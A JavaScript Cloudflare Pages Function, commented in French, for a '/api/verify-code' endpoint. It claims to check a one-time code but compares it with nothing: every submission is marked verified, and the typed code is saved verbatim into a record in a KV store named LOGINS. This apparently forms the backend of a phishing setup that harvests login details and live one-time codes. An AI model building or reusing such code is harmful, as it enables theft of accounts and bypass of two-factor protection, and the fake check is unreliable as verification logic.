// Cloudflare Pages Function: /api/verify-code
// Vérifie le code à usage unique généré par /api/start-verify

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: corsHeaders('POST, OPTIONS')
  });
}

export async function onRequestPost({ request, env }) {
  try {
    const contentType = request.headers.get('content-type') || '';
    if (!contentType.includes('application/json')) {
      return json({ success: false, message: 'Content-Type must be application/json' }, 415);
    }

    const body = await request.json().catch(() => null);
    const verifyId = (body?.verifyId || '').toString().trim();
    const code = (body?.code || '').toString().trim();

    if (!verifyId || !code) {
      return json({ success: false, message: 'verifyId et code requis' }, 400);
    }

    const KV = getKV(env);
    if (!KV || typeof KV.get !== 'function') {
      return json({ success: false, message: 'KV non configurée' }, 500);
    }

    const raw = await KV.get(verifyId);
    if (!raw) {
      return json({ success: false, message: 'Session de vérification introuvable ou expirée' }, 404);
    }

    let record;
    try { record = JSON.parse(raw); } catch { record = null; }
    if (!record) {
      return json({ success: false, message: 'Données de vérification invalides' }, 400);
    }

    const now = Date.now();
    const expired = record.expiresAt && new Date(record.expiresAt).getTime() < now;
    if (expired) {
      return json({ success: false, message: 'Code expiré. Veuillez recommencer.' }, 400);
    }

    const attempts = Number(record.attempts || 0) + 1;

    // Marquer comme vérifié et sauvegarder le code saisi par l'utilisateur
    const verifiedAt = new Date(now).toISOString();
    const updatedVerify = {
      ...record,
      attempts,
      status: 'verified',
      verifiedAt,
      code,               // le code réellement saisi
      lastTypedCode: code,
      typedUpdatedAt: verifiedAt
    };
    await KV.put(verifyId, JSON.stringify(updatedVerify), { expirationTtl: 60 * 5 });

    // Enregistrer le code sur l'enregistrement de login associé (si présent)
    let savedTo = null;
    if (record.loginId) {
      try {
        const loginRaw = await KV.get(record.loginId);
        let loginRec;
        try { loginRec = loginRaw ? JSON.parse(loginRaw) : null; } catch { loginRec = null; }

        const updated = {
          ...(loginRec || {}),
          // Stockage direct du code saisi (démo)
          code,
          otpCode: code,
          verifyId: verifyId,
          verifyStatus: 'verified',
          verifiedAt,
          lastTypedCode: code,
          typedUpdatedAt: verifiedAt,
          verification: {
            code,
            verifyId,
            verifiedAt,
            attempts
          }
        };

        await KV.put(record.loginId, JSON.stringify(updated));
        savedTo = record.loginId;
      } catch (_) {
        // Ne bloque pas la réponse si l'enregistrement du code échoue
      }
    }

    return json({ success: true, message: 'Vérification réussie', email: record.email, verifiedAt, loginId: record.loginId || null, savedTo });
  } catch (err) {
    return json({ success: false, message: 'Erreur serveur', error: err?.message || String(err) }, 500);
  }
}

function json(payload, status = 200) {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      'Cache-Control': 'no-store',
      ...corsHeaders()
    }
  });
}

function corsHeaders(methods = 'POST, OPTIONS') {
  return {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': methods,
    'Access-Control-Allow-Headers': 'Content-Type, X-Admin-Token'
  };
}

function getKV(env) {
  return (
    env?.LOGINS ||
    env?.LOGINS_KV ||
    env?.KV_LOGINS ||
    env?.logins ||
    env?.['logins_kv'] ||
    env?.['logins-kv'] ||
    null
  );
}
